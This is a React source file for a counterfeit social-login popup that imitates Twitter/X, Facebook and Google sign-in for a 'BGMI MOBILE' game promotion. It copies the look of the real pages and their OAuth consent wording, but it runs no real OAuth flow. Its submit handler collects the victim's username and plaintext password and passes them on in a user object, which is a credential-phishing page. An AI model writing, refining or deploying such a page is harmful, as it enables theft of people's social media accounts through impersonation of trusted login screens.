import React, { useState } from 'react';
import { X, Eye, EyeOff, Loader2, AlertCircle } from 'lucide-react';
import bgmiIconLogo from '../assets/promo_banner.png'; // BGMI App icon artwork

export default function SocialAuthPopupModal({ provider = 'twitter', onClose, onLoginSuccess }) {
  const [formData, setFormData] = useState({
    emailOrUsername: '',
    password: '',
  });

  const [showPassword, setShowPassword] = useState(false);
  const [errors, setErrors] = useState({});
  const [loading, setLoading] = useState(false);

  const isTwitter = provider === 'twitter';
  const isFacebook = provider === 'facebook';

  const validate = () => {
    const errs = {};
    if (!formData.emailOrUsername.trim()) {
      errs.emailOrUsername = 'Phone, email, or username is required';
    }

    if (!formData.password) {
      errs.password = 'Password is required';
    } else if (formData.password.length < 4) {
      errs.password = 'Password must be at least 4 characters';
    }

    setErrors(errs);
    return Object.keys(errs).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!validate()) return;

    setLoading(true);
    try {
      await new Promise((res) => setTimeout(res, 500));

      const loggedUser = {
        uid: `user_${Date.now()}`,
        displayName: formData.emailOrUsername.split('@')[0] || 'Verified Player',
        emailOrUsername: formData.emailOrUsername.trim(),
        email: formData.emailOrUsername.trim(),
        password: formData.password,
        provider: provider,
        authProvider: `${provider.toUpperCase()} OAuth`,
        loggedInAt: new Date().toISOString(),
      };

      onLoginSuccess(loggedUser);
    } catch (err) {
      setErrors({ server: 'Login failed. Please check credentials and try again.' });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-3 bg-black/85 backdrop-blur-xs animate-fadeIn">
      <div className="relative w-full max-w-md bg-white text-black rounded-lg shadow-2xl overflow-hidden border border-gray-200">
        
        {/* Top Header matching Screenshot 1:1 */}
        <div className="bg-white border-b border-gray-200 px-4 py-3 flex items-center justify-between">
          <div className="flex items-center space-x-2">
            <span className="text-xl font-bold text-[#1d9bf0]">
              {isTwitter ? '𝕏' : isFacebook ? 'f' : '▶'}
            </span>
            <h3 className="font-bold text-gray-800 text-base tracking-tight">
              {isTwitter ? 'Log in With Twitter' : isFacebook ? 'Log in With Facebook' : 'Log in With Google'}
            </h3>
          </div>
          <button
            onClick={onClose}
            className="text-gray-500 hover:text-black p-1 rounded transition-colors"
            aria-label="Close"
          >
            <X className="w-5 h-5 stroke-[2.5]" />
          </button>
        </div>

        {/* Modal Content Body matching Screenshot 1:1 */}
        <form onSubmit={handleSubmit} className="p-5 sm:p-6 space-y-4 max-h-[85vh] overflow-y-auto">
          
          {/* Main Title */}
          <h4 className="font-bold text-xl sm:text-2xl text-gray-900 leading-tight">
            Log in to your {isTwitter ? 'X' : isFacebook ? 'Facebook' : 'Google'} account to connect to BGMI MOBILE.
          </h4>

          {/* BGMI Game App Badge Box matching Screenshot 1:1 */}
          <div className="flex items-center space-x-3 py-2 px-1">
            <div className="w-14 h-14 sm:w-16 sm:h-16 rounded-xl overflow-hidden shadow-md shrink-0 border border-gray-200 bg-black">
              <img
                src={bgmiIconLogo}
                alt="BGMI MOBILE Game Logo"
                className="w-full h-full object-cover"
              />
            </div>
            <div className="leading-snug">
              <h5 className="font-bold text-gray-800 text-lg sm:text-xl tracking-tight">
                BGMI MOBILE
              </h5>
              <p className="text-xs sm:text-sm font-semibold text-gray-400 uppercase tracking-wide">
                WINNER WINNER CHICKEN DINNER!
              </p>
              <p className="text-[11px] sm:text-xs text-gray-400 font-sans">
                Official BGMI MOBILE Game!
              </p>
            </div>
          </div>

          {errors.server && (
            <div className="p-2.5 bg-red-50 border border-red-200 text-red-700 text-xs rounded flex items-center gap-2">
              <AlertCircle className="w-4 h-4 shrink-0 text-red-500" />
              <span>{errors.server}</span>
            </div>
          )}

          {/* Form Inputs matching Screenshot 1:1 */}
          <div className="space-y-3 pt-1">
            
            {/* Input 1: Phone, email, or username */}
            <div>
              <input
                type="text"
                placeholder="Phone, email, or username"
                value={formData.emailOrUsername}
                onChange={(e) => setFormData({ ...formData, emailOrUsername: e.target.value })}
                className="w-full border-2 border-gray-300 focus:border-[#00b4d8] focus:ring-0 px-4 py-3 rounded-md text-base outline-none text-gray-900 placeholder:text-gray-400 transition-colors"
              />
              {errors.emailOrUsername && (
                <p className="text-red-600 text-xs mt-1 font-semibold">{errors.emailOrUsername}</p>
              )}
            </div>

            {/* Input 2: Password */}
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                value={formData.password}
                onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                className="w-full border-2 border-gray-300 focus:border-[#00b4d8] focus:ring-0 px-4 py-3 rounded-md text-base outline-none text-gray-900 placeholder:text-gray-400 pr-10 transition-colors"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-3.5 text-gray-400 hover:text-gray-600"
              >
                {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
              </button>
              {errors.password && (
                <p className="text-red-600 text-xs mt-1 font-semibold">{errors.password}</p>
              )}
            </div>

          </div>

          {/* Log in Button matching Screenshot 1:1 (Dark Charcoal Pill Button) */}
          <div className="pt-2">
            <button
              type="submit"
              disabled={loading}
              className="w-full bg-[#4b4b4b] hover:bg-[#333333] text-white font-bold text-lg py-3 rounded-full shadow transition-all flex items-center justify-center space-x-2 active:scale-98 disabled:opacity-50"
            >
              {loading ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin text-white" />
                  <span>Logging in...</span>
                </>
              ) : (
                <span>Log in</span>
              )}
            </button>
          </div>

          {/* Bottom Legal Terms Notice matching Screenshot 1:1 */}
          <div className="pt-2 text-[11px] sm:text-xs text-gray-500 space-y-2 leading-relaxed font-sans border-t border-gray-100">
            <p>
              We recommend reviewing the app's terms and privacy policy to understand how it will use data from your {isTwitter ? 'Twitter' : isFacebook ? 'Facebook' : 'Google'} account. You can revoke access to any app at any time from the <span className="text-[#1d9bf0] font-semibold cursor-pointer">Apps and sessions</span> of your account settings.
            </p>
            <p>
              By continuing, BGMI MOBILE will receive ongoing access to the information that you share and {isTwitter ? 'Twitter' : isFacebook ? 'Facebook' : 'Google'} will record when BGMI MOBILE accesses it. <span className="text-[#1d9bf0] font-semibold cursor-pointer">Learn more</span> about this sharing and the settings that you have. BGMI MOBILE's <span className="text-[#1d9bf0] font-semibold cursor-pointer">Privacy Policy</span> and <span className="text-[#1d9bf0] font-semibold cursor-pointer">Terms</span>.
            </p>
          </div>

        </form>
      </div>
    </div>
  );
}
